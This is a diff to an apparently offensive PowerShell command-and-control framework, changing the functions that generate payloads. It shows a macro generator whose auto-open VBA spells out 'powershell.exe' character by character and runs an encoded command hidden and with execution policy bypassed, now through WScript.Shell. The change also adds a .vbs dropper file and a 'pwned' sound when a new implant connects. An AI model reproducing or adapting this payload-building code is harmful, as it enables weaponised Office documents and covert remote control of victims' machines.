@@ -246,7 +246,10 @@ function CreatePayload
 
     Write-Host -Object "Batch Payload written to: $global:newdir\payload.bat"  -ForegroundColor Green
 }
-function CreateStandAloneExe {
+
+# create exe 
+function CreateStandAloneExe 
+{
 $bytescom = [System.Text.Encoding]::Unicode.GetBytes($command)
 $praw = [Convert]::ToBase64String($bytescom)
 $csccode = 'using System;
@@ -345,6 +348,7 @@ if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
 }
 
 }
+
 # create macro payloads
 function CreateMacroPayload 
 {
@@ -359,61 +363,62 @@ function CreateMacroPayload
         $payloadbits = $payloadbits +'str = str + "'+$y+'"'+"`r`n"
     }
 
-    $macro = '
-    Sub Auto_Open()
-    UpdateMacro
-    End Sub
+    $macro = 'Sub Auto_Open()
+UpdateMacro
+End Sub
 
-    Sub AutoOpen()
-    UpdateMacro
-    End Sub
+Sub AutoOpen()
+UpdateMacro
+End Sub
 
-    Sub Workbook_Open()
-    UpdateMacro
-    End Sub
+Sub Workbook_Open()
+UpdateMacro
+End Sub
 
-    Sub WorkbookOpen()
-    UpdateMacro
-    End Sub
+Sub WorkbookOpen()
+UpdateMacro
+End Sub
 
-    Sub Document_Open()
-    UpdateMacro
-    End Sub
+Sub Document_Open()
+UpdateMacro
+End Sub
 
-    Sub DocumentOpen()
-    UpdateMacro
-    End Sub
+Sub DocumentOpen()
+UpdateMacro
+End Sub
 
-    Sub UpdateMacro()
-    Dim str As String
-    Dim exec As String
+Sub UpdateMacro()
+Dim str, exec, wsh 
 
-    str = ""
+str = ""
 '+$payloadbits+'
+exec = "p"
+exec = exec + "o"
+exec = exec + "w"
+exec = exec + "e"
+exec = exec + "r"
+exec = exec + "s"
+exec = exec + "h"
+exec = exec + "e"
+exec = exec + "l"
+exec = exec + "l"
+exec = exec + "."
+exec = exec + "e"
+exec = exec + "x"
+exec = exec + "e"
+exec = exec + " -exec bypass -Noninteractive -windowstyle hidden -e " & str
 
-    exec = "p"
-    exec = exec + "o"
-    exec = exec + "w"
-    exec = exec + "e"
-    exec = exec + "r"
-    exec = exec + "s"
-    exec = exec + "h"
-    exec = exec + "e"
-    exec = exec + "l"
-    exec = exec + "l"
-    exec = exec + "."
-    exec = exec + "e"
-    exec = exec + "x"
-    exec = exec + "e"
-    exec = exec + " -exec bypass -Noninteractive -windowstyle hidden -e " & str
+Set wsh = CreateObject( "WScript.Shell" )
+wsh.Exec(exec)
 
-    Shell(exec)
+End Sub'
 
-    End Sub'
+    [IO.File]::WriteAllLines("$global:newdir\macro.txt", $macro)
+    $wscript = $macro + "`nUpdateMacro"
+    [IO.File]::WriteAllLines("$global:newdir\wscript.vbs", $wscript)
 
-    [IO.File]::WriteAllLines("$global:newdir\macro.vbs", $macro)
-
-    Write-Host -Object "Macro Payload written to: $global:newdir\macro.vbs"  -ForegroundColor Green
+    Write-Host -Object "Macro Payload written to: $global:newdir\macro.txt"  -ForegroundColor Green
+    Write-Host -Object "Wscript Payload written to: $global:newdir\wscript.vbs"  -ForegroundColor Green
 }
 
 # taken from nishang Out-Java
@@ -817,7 +822,9 @@ while ($listener.IsListening)
         # if ($im_domain -ne "safenet") { do something }
         #
         ## add anti-ir and implant safety mechanisms here!
-
+        $sound = new-Object System.Media.SoundPlayer;
+        $sound.SoundLocation="C:\Temp\PowershellC2\Sounds\pwned.wav";
+        $sound.Play()
         Write-Host "New host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
         Write-Host "$endpointip | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green
 
